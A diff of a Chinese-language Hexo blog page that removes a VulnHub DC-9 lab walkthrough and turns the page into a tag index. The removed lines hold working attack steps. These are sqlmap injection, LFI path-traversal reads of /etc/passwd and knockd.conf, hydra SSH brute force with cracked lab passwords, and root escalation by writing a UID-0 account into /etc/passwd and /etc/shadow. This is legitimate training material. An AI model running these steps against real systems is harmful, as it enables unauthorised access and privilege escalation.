@@ -27,7 +27,7 @@
   <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
   <meta name="apple-mobile-web-app-title" content="Blog">
   
-  
+  <meta name="robots" content="noindex,follow">
   <meta name="generator" content="Hexo 7.3.0">
   <meta http-equiv='x-dns-prefetch-control' content='on' />
   
@@ -39,31 +39,25 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
   <meta name="theme-color" content="#f9fafb">
-  <title>VulnHub DC-9 靶机渗透测试笔记 - blog</title>
+  <title>标签：Servlet - blog</title>
 
   
-    <meta name="description" content="VulnHub DC-9 靶机渗透测试笔记 靶机信息  靶机名称：DC-9（DC 系列最终章 🎯） 靶机来源：VulnHub 目标：获取 root 权限，找到最终 flag 难度：⭐⭐⭐⭐☆（较难） 涉及技术：SQL 注入、文件包含（LFI）、Port Knocking、SSH 爆破、sudo 提权、&#x2F;etc&#x2F;passwd 写入提权 https:&#x2F;&#x2F;www.cnblogs.c">
-<meta property="og:type" content="article">
-<meta property="og:title" content="VulnHub DC-9 靶机渗透测试笔记">
-<meta property="og:url" content="https://wr0ld.github.io/posts/f10adb67/">
+    <meta name="description" content="wr0ld 的个人博客，记录技术学习与生活点滴">
+<meta property="og:type" content="website">
+<meta property="og:title" content="blog">
+<meta property="og:url" content="https://wr0ld.github.io/tags/Servlet/">
 <meta property="og:site_name" content="blog">
-<meta property="og:description" content="VulnHub DC-9 靶机渗透测试笔记 靶机信息  靶机名称：DC-9（DC 系列最终章 🎯） 靶机来源：VulnHub 目标：获取 root 权限，找到最终 flag 难度：⭐⭐⭐⭐☆（较难） 涉及技术：SQL 注入、文件包含（LFI）、Port Knocking、SSH 爆破、sudo 提权、&#x2F;etc&#x2F;passwd 写入提权 https:&#x2F;&#x2F;www.cnblogs.c">
+<meta property="og:description" content="wr0ld 的个人博客，记录技术学习与生活点滴">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://wr0ld.github.io/avatar.png">
-<meta property="article:published_time" content="2026-03-18T04:00:00.000Z">
-<meta property="article:modified_time" content="2026-04-05T04:26:01.146Z">
 <meta property="article:author" content="wr0ld">
-<meta property="article:tag" content="靶机渗透">
-<meta property="article:tag" content="VulnHub">
-<meta property="article:tag" content="vulnhub-DC">
-<meta property="article:tag" content="提权">
-<meta property="article:tag" content="提权 SQL注入">
-<meta name="twitter:card" content="summary_large_image">
+<meta property="article:tag" content="blog, hexo, stellar, 技术, 编程">
+<meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://wr0ld.github.io/avatar.png">
   
   
   
-  <meta name="keywords" content="靶机渗透,VulnHub,vulnhub-DC,提权,提权 SQL注入">
+  <meta name="keywords" content="blog, hexo, stellar, 技术, 编程">
 
   <!-- feed -->
   
@@ -77,12 +71,12 @@
 
   
 
-  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-03-18T12:00:00+08:00","dateModified":"2026-04-05T12:26:01+08:00","datePublished":"2026-03-18T12:00:00+08:00","description":"","headline":"VulnHub DC-9 靶机渗透测试笔记","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/f10adb67/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/f10adb67/","keywords":"靶机渗透, VulnHub, vulnhub-DC, 提权, 提权 SQL注入","thumbnailUrl":"/images/VulnHub.jpg","image":1}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"Website","@id":"https://wr0ld.github.io","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"name":"blog","description":"wr0ld 的个人博客，记录技术学习与生活点滴","url":"https://wr0ld.github.io"}</script>
   
 </head>
 <body>
 
-<div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+<div class="l_body index" id="start" layout="undefined" type="undefined" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
 
 
 <header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">blog</div></a></div></header>
@@ -94,351 +88,134 @@
 <div class="widgets">
 <div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
 
+
+
 <widget class="widget-wrapper todo-widget collapsible-widget"><div class="widget-header dis-select"><span class="name">任务简报 <span class="todo-count">(12)</span></span><span class="collapse-toggle"><i class="fas fa-chevron-down"></i></span></div><div class="widget-body fs14"><div class="todo-list"><div class="todo-item doing"><span class="todo-content">内存马Listener Valve</span></div><div class="todo-item doing"><span class="todo-content">log4j 内存马</span></div><div class="todo-item doing"><span class="todo-content">EDUSRC实战漏洞挖掘复盘脱敏</span></div><div class="todo-item doing"><span class="todo-content">小迪vpc1-5 Windows系统web内网横向域内</span></div><div class="todo-item doing"><span class="todo-content">rootkit 的 shellcode 嵌入</span></div><div class="todo-item doing"><span class="todo-content">fastjson 1.2.68 → 1.2.80</span></div><div class="todo-item doing"><span class="todo-content">java cc4 5 7</span></div><div class="todo-item doing"><span class="todo-content">Shiro 721</span></div><div class="todo-item doing"><span class="todo-content">信息收集方法论</span></div><div class="todo-item doing"><span class="todo-content">PHP反序列化 + Pop Chain构造</span></div><div class="todo-item doing"><span class="todo-content">云上服务</span></div><div class="todo-item doing"><span class="todo-content">docker容器逃逸</span></div></div></div></widget>
 </div>
 
 </div></aside><div class="l_main" id="main">
 
+<header class="header mobile-only"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">blog</div></a></div></header>
+
+ 
 
 
 
 
-<div class="article banner top">
-  <div class="content">
-    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
-<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/linux/">linux</a> <span class="sep"></span> <a class="cap breadcrumb-link" href="/categories/linux/vulnhub-DC/">vulnhub-DC</a></div>
-<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2026-03-18T04:00:00.000Z">2026-03-18</time></span><span class="sep"></span><span class="text word-count">字数：4457</span><span class="sep"></span><span class="text img-count">图片：32</span></div></div></div>
-    
-    <div class="bottom only-title">
-      
-      <div class="text-area">
-        <h1 class="text title"><span>VulnHub DC-9 靶机渗透测试笔记</span></h1>
-        
-      </div>
+<div class="navbar top"><div class="navbar-blur"><div class="navbar-container"><nav class="post"><a href="/">近期发布</a><a href="/categories/">分类</a><a href="/archives/">归档</a><span style="flex: 1;"></span><a href="/srk-toolbox/">SRK Toolbox</a><a href="/payloader/">Payloader</a></nav></div></div></div>
+
+<div class="layout-switcher">
+  <button class="layout-toggle-btn" title="切换布局">
+    <i class="fas fa-chevron-up"></i>
+  </button>
+  <div class="layout-options">
+    <div class="options-section">
+      <div class="options-label">布局方式 <span class="default-layout-hint">(默认: 网格)</span></div>
+      <button class="layout-btn" data-layout="list"><span>列表</span></button>
+      <button class="layout-btn active" data-layout="grid"><span>网格</span></button>
+      <button class="layout-btn" data-layout="compact"><span>紧凑</span></button>
+      <button class="layout-btn" data-layout="title-only"><span>仅标题</span></button>
     </div>
-    
   </div>
-  </div><article class="md-text content"><h1 id="VulnHub-DC-9-靶机渗透测试笔记"><a href="#VulnHub-DC-9-靶机渗透测试笔记" class="headerlink" title="VulnHub DC-9 靶机渗透测试笔记"></a>VulnHub DC-9 靶机渗透测试笔记</h1><blockquote>
-<p><strong>靶机信息</strong></p>
-<ul>
-<li>靶机名称：DC-9（DC 系列最终章 🎯）</li>
-<li>靶机来源：VulnHub</li>
-<li>目标：获取 root 权限，找到最终 flag</li>
-<li>难度：⭐⭐⭐⭐☆（较难）</li>
-<li>涉及技术：SQL 注入、文件包含（LFI）、Port Knocking、SSH 爆破、sudo 提权、&#x2F;etc&#x2F;passwd 写入提权</li>
-<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wrold/p/19687335">https://www.cnblogs.com/wrold/p/19687335</a></li>
-</ul>
-</blockquote>
-<hr>
-<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1-1-主机发现"><a href="#1-1-主机发现" class="headerlink" title="1.1 主机发现"></a>1.1 主机发现</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.168.0/24</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image1.png"></p>
-<p>目标 IP：<code>192.168.168.169</code></p>
-<h3 id="1-2-端口与服务扫描"><a href="#1-2-端口与服务扫描" class="headerlink" title="1.2 端口与服务扫描"></a>1.2 端口与服务扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p- 192.168.168.169</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image2.png"></p>
-<p>扫到 SSH，但是被防火墙拦截：</p>
-<blockquote>
-<p><strong>💡 filtered 和 open 的区别：</strong></p>
-<table>
-<thead>
-<tr>
-<th>状态</th>
-<th>含义</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>open</td>
-<td>端口开放，可以直接连</td>
-</tr>
-<tr>
-<td>filtered</td>
-<td>被防火墙拦截，连不上</td>
-</tr>
-<tr>
-<td>closed</td>
-<td>端口关闭</td>
-</tr>
-</tbody></table>
-<p><strong>filtered 就是 knockd 在生效</strong>，SSH 存在但被防火墙挡住了，需要先「敲门」才能变成 open，这就是本题的关键机制之一。</p>
-</blockquote>
-<hr>
-<h2 id="二、SQL-注入"><a href="#二、SQL-注入" class="headerlink" title="二、SQL 注入"></a>二、SQL 注入</h2><h3 id="2-1-发现注入点"><a href="#2-1-发现注入点" class="headerlink" title="2.1 发现注入点"></a>2.1 发现注入点</h3><p>依旧改hosts</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image3.png"></p>
-<p>有个搜索功能，用 Burp Suite 抓包：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image4.png"></p>
-<p>POST 抓包：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image5.png"></p>
-<p>标记注入点，保存为 sql.txt，用 sqlmap 跑：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r D:\Backup\桌面\sql.txt --dbs</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image6.png"></p>
-<p>跑出来了，有两个库：</p>
-<p>这个后续的ssh爆破有用</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image7.png"></p>
-<p>找到admin的密码</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image8.png"></p>
-<h3 id="2-2-破解哈希"><a href="#2-2-破解哈希" class="headerlink" title="2.2 破解哈希"></a>2.2 破解哈希</h3><p>把拿到的哈希去在线网站解密：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://hashes.com/zh/decrypt/hash</span><br><span class="line">856f5de590ef37314e7c3bdf6f8a66dc → transorbital1</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image9.png"></p>
-<h3 id="2-3-登录后台"><a href="#2-3-登录后台" class="headerlink" title="2.3 登录后台"></a>2.3 登录后台</h3><p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image10.png"></p>
-<p>后台有个添加记录功能：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image11.png"></p>
-<p>显示所有记录，可以看到刚刚输入的信息：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image12.png"></p>
-<p>不过好像没啥用，还是拿不到 Web 权限，换个思路继续找。</p>
-<hr>
-<h2 id="三、文件包含漏洞（LFI）"><a href="#三、文件包含漏洞（LFI）" class="headerlink" title="三、文件包含漏洞（LFI）"></a>三、文件包含漏洞（LFI）</h2><h3 id="3-1-发现文件包含"><a href="#3-1-发现文件包含" class="headerlink" title="3.1 发现文件包含"></a>3.1 发现文件包含</h3><p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image13.png"></p>
-<p>看到一个「文件不存在」的提示，感觉有文件包含，随便试了一下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://wordy/manage.php?file=../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image14.png"></p>
-<p>成功读取到 <code>/etc/passwd</code>！</p>
-<blockquote>
-<p>正常情况下应该还是需要 fuzz 一下参数名的，用 bp 或者 ffuf 都行。</p>
-</blockquote>
-<h3 id="3-2-用-LFI-读取-knockd-conf"><a href="#3-2-用-LFI-读取-knockd-conf" class="headerlink" title="3.2 用 LFI 读取 knockd.conf"></a>3.2 用 LFI 读取 knockd.conf</h3><p>不会了，涉及到知识盲区，翻 wp 了解到一个 <code>/etc/knockd.conf</code> 文件，里面记录了 SSH 的 port knocking 配置。</p>
-<p>用 LFI 读取配置文件获取敲门序列：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.168.169/manage.php?file=../../../../../../../etc/knockd.conf</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image15.png"></p>
-<blockquote>
-<p><strong>💡 这就是 LFI 的价值所在：</strong> 不仅能读 <code>/etc/passwd</code>，还能读各种敏感配置文件，比如这里的 knockd.conf，直接暴露了敲门序列。</p>
-</blockquote>
-<hr>
-<h2 id="四、Port-Knocking-敲门"><a href="#四、Port-Knocking-敲门" class="headerlink" title="四、Port Knocking 敲门"></a>四、Port Knocking 敲门</h2><p>读出来的配置意思是：</p>
-<p><strong>🔓 开启 SSH（openSSH）：</strong> 按顺序敲这三个端口：<code>7469 → 8475 → 9842</code>，敲完后 SSH 的 22 端口才会对你开放。</p>
-<p><strong>🔒 关闭 SSH（closeSSH）：</strong> 按顺序敲：<code>9842 → 8475 → 7469</code>（反过来）</p>
-<p>敲门有三种方法：</p>
-<p><strong>方法一：knock 工具（最简单）</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Kali 安装</span></span><br><span class="line">apt install knockd</span><br><span class="line"><span class="comment"># 敲门</span></span><br><span class="line">knock 192.168.168.169 7469 8475 9842</span><br></pre></td></tr></table></figure>
-
-<p><strong>方法二：nmap 逐个敲</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn --host-timeout 201 --max-retries 0 -p 7469 192.168.168.169</span><br><span class="line">nmap -Pn --host-timeout 201 --max-retries 0 -p 8475 192.168.168.169</span><br><span class="line">nmap -Pn --host-timeout 201 --max-retries 0 -p 9842 192.168.168.169</span><br></pre></td></tr></table></figure>
-
-<p><strong>方法三：nc 敲</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -z 192.168.168.169 7469</span><br><span class="line">nc -z 192.168.168.169 8475</span><br><span class="line">nc -z 192.168.168.169 9842</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>⚠️ 注意：配置中 <code>seq_timeout = 25</code>，只有 <strong>25 秒</strong>的时间窗口，敲完要立刻 SSH 连接！</p>
-</blockquote>
-<p>用第一种方法后就正常了：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image16.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image17.png"></p>
-<hr>
-<h2 id="五、SSH-爆破"><a href="#五、SSH-爆破" class="headerlink" title="五、SSH 爆破"></a>五、SSH 爆破</h2><h3 id="5-1-提取数据库账号密码"><a href="#5-1-提取数据库账号密码" class="headerlink" title="5.1 提取数据库账号密码"></a>5.1 提取数据库账号密码</h3><p>之前 SQL 注入还有另一个库，保存一下账号密码，用 hydra 爆破 SSH。</p>
-<p>关于数据库里的数据怎么快速提取出来，可以写脚本，或者直接让 AI 帮你提：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image19.png"></p>
-<h3 id="5-2-第一轮爆破"><a href="#5-2-第一轮爆破" class="headerlink" title="5.2 第一轮爆破"></a>5.2 第一轮爆破</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L u.txt -P p.txt 192.168.168.169 ssh</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image18.png"></p>
-<p>结果出现了三个：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image20.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">login: chandlerb   password: UrAG0D!</span><br><span class="line">login: joeyt       password: Passw0rd</span><br><span class="line">login: janitor     password: Ilovepeepee</span><br></pre></td></tr></table></figure>
-
-<h3 id="5-3-翻用户目录发现新密码"><a href="#5-3-翻用户目录发现新密码" class="headerlink" title="5.3 翻用户目录发现新密码"></a>5.3 翻用户目录发现新密码</h3><p>都翻一下，在 janitor 的 <code>.secrets-for-putin</code> 目录里发现了新密码：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image21.png"></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> &gt; p.txt &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">BamBam01</span></span><br><span class="line"><span class="string">Passw0rd</span></span><br><span class="line"><span class="string">smellycats</span></span><br><span class="line"><span class="string">P0Lic#10-4</span></span><br><span class="line"><span class="string">B4-Tru3-001</span></span><br><span class="line"><span class="string">4uGU5T-NiGHts</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="5-4-第二轮爆破"><a href="#5-4-第二轮爆破" class="headerlink" title="5.4 第二轮爆破"></a>5.4 第二轮爆破</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L u.txt -P p.txt 192.168.168.169 ssh</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image22.png"></p>
-<p>又爆出了新用户，SSH 登录 fredf：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh fredf@192.168.168.169</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image23.png"></p>
-<p>发现一个 sudo 特权！</p>
-<hr>
-<h2 id="六、分析-test-二进制文件"><a href="#六、分析-test-二进制文件" class="headerlink" title="六、分析 test 二进制文件"></a>六、分析 test 二进制文件</h2><h3 id="6-1-查看文件内容"><a href="#6-1-查看文件内容" class="headerlink" title="6.1 查看文件内容"></a>6.1 查看文件内容</h3><p>本来想直接 cat 看看啥东西的，结果蹦我一脸乱码，应该是个二进制文件：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image24.png"></p>
-<p>用 strings 提取可读字符串大概看看：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings /opt/devstuff/dist/test/test</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image25.png"></p>
-<p>不过还是太多了，直接执行看看：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image26.png"></p>
-<p>是 Python 打包后的二进制，找一下源代码：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -name <span class="string">&quot;test.py&quot;</span> 2&gt;/dev/null</span><br><span class="line"><span class="built_in">cat</span> /opt/devstuff/test.py</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image27.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image28.png"></p>
-<h3 id="6-2-分析源码"><a href="#6-2-分析源码" class="headerlink" title="6.2 分析源码"></a>6.2 分析源码</h3><p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image29.png"></p>
-<blockquote>
-<p><strong>📝 分析含义：</strong> 需要三个参数，如果不是 3 则输出 “Usage: …”，满足 3 个参数，则把第 2 个参数的文件内容<strong>追加写入</strong>到第 3 个参数的文件中。</p>
-<p><strong>💡 提权思路：</strong></p>
-<ol>
-<li><code>/opt/devstuff/dist/test/test</code> 可以以 root 身份运行</li>
-<li>构造有 root 权限的账户写入 &#x2F;etc&#x2F;passwd 或 &#x2F;etc&#x2F;shadow</li>
-<li>以该用户登录系统</li>
-</ol>
-</blockquote>
-<hr>
-<h2 id="七、提权"><a href="#七、提权" class="headerlink" title="七、提权"></a>七、提权</h2><h3 id="7-1-尝试无密码写入-passwd（失败）"><a href="#7-1-尝试无密码写入-passwd（失败）" class="headerlink" title="7.1 尝试无密码写入 passwd（失败）"></a>7.1 尝试无密码写入 passwd（失败）</h3><p>那可以直接创建一个无密码用户写到 passwd 里试试：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;hack::0:0:hack:/root:/bin/bash&#x27;</span> &gt; /tmp/hack.txt</span><br><span class="line"><span class="built_in">sudo</span> ./test /tmp/hack.txt /etc/passwd</span><br><span class="line">su hack</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image30.png"></p>
-<p>失败了，还是得加密码才行。</p>
-<h3 id="7-2-尝试-MD5-哈希写入-passwd（失败）"><a href="#7-2-尝试-MD5-哈希写入-passwd（失败）" class="headerlink" title="7.2 尝试 MD5 哈希写入 passwd（失败）"></a>7.2 尝试 MD5 哈希写入 passwd（失败）</h3><p>加密码必须要 hash 加密，用 openssl 方便：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 123456</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p><strong>passwd 密码字段结构：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hack : x : 0 : 0 : hack : /root : /bin/bash</span><br><span class="line"> ①    ②   ③   ④    ⑤      ⑥         ⑦</span><br></pre></td></tr></table></figure>
-<table>
-<thead>
-<tr>
-<th>字段</th>
-<th>含义</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>①</td>
-<td>用户名</td>
-</tr>
-<tr>
-<td>②</td>
-<td>密码（x&#x3D;去shadow找，空&#x3D;无密码，哈希&#x3D;直接验证）</td>
-</tr>
-<tr>
-<td>③</td>
-<td>UID（0就是root权限）</td>
-</tr>
-<tr>
-<td>④</td>
-<td>GID（组ID）</td>
-</tr>
-<tr>
-<td>⑤</td>
-<td>备注</td>
-</tr>
-<tr>
-<td>⑥</td>
-<td>家目录</td>
-</tr>
-<tr>
-<td>⑦</td>
-<td>登录shell</td>
-</tr>
-</tbody></table>
-</blockquote>
-<p>密码格式是 <code>$1$盐值$哈希值</code>，每次盐值不同所以哈希不一样，但都是 123456 的哈希：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image31.png"></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;hack:$1$3MSvX.EZ$ow32gSnIJJZWUeUkZ0cX50:0:0:hack:/root:/bin/bash&#x27;</span> &gt; /tmp/hack.txt</span><br><span class="line"><span class="built_in">sudo</span> ./test /tmp/hack.txt /etc/passwd</span><br><span class="line">su hack  <span class="comment"># 输入 123456</span></span><br></pre></td></tr></table></figure>
-
-<p>又失败了！</p>
-<blockquote>
-<p><strong>原因分析：</strong> 加了 <code>-1</code> 参数生成的是 MD5-crypt 格式（<code>$1$</code>），系统不去 passwd 验证，直接找 shadow 认证。只有不加参数用 <code>openssl passwd 123456</code> 生成旧版本的 DES 加密，才会去 passwd 找密码。（也有可能是我环境问题）</p>
-</blockquote>
-<h3 id="7-3-成功提权-🎉"><a href="#7-3-成功提权-🎉" class="headerlink" title="7.3 成功提权 🎉"></a>7.3 成功提权 🎉</h3><p>既然该用户有 root 权限的读写，直接改 shadow 文件也行：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成 SHA-512 哈希</span></span><br><span class="line">openssl passwd -6 123456</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入 shadow</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;hackerx:$6$xxx....:18259:0:99999:7:::&#x27;</span> &gt; /tmp/h.txt</span><br><span class="line"><span class="built_in">sudo</span> /opt/devstuff/dist/test/test /tmp/h.txt /etc/shadow</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入 passwd</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;hackerx:x:0:0:hackerx:/root:/bin/bash&#x27;</span> &gt; /tmp/p.txt</span><br><span class="line"><span class="built_in">sudo</span> /opt/devstuff/dist/test/test /tmp/p.txt /etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 登录</span></span><br><span class="line">su - hackerx</span><br><span class="line"><span class="comment"># 输入 